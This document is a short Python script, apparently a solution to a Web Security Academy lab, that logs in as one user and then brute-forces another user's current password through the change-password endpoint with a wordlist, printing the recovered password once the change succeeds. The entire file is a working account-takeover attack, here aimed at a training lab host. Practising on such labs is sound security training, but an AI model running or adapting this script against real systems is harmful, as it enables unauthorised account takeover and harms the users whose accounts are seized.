from requests import Session

username, password = 'wiener', 'peter'


def brute(host, dict_pass, new_pass='qwe'):
    s = Session()
    r = s.post(f'{host}/login', data={'username': username, 'password': password})
    # print(r.status_code, r.text)
    r = s.post(
        f'{host}/my-account/change-password',
        data={'username': 'carlos',
              'current-password': dict_pass,
              'new-password-1': new_pass,
              'new-password-2': new_pass},
        allow_redirects=True
    )
    # print(r.text)
    if 'Password changed successfully!' in r.text:
        print(f'old pass:{dict_pass}\nnew pass: {new_pass}')
        exit(0)

def load_pass(filename):
    with open(filename) as file:
        for line in file:
            yield line.strip()

if __name__ == '__main__':
    host = 'https://0ade00bc03037f7482fa4df60096000a.web-security-academy.net'
    passwords_filename = "/home/cotsom/Desktop/stuff/burp/swiggetlist"
    for _pass in load_pass(passwords_filename):
        brute(host, _pass)
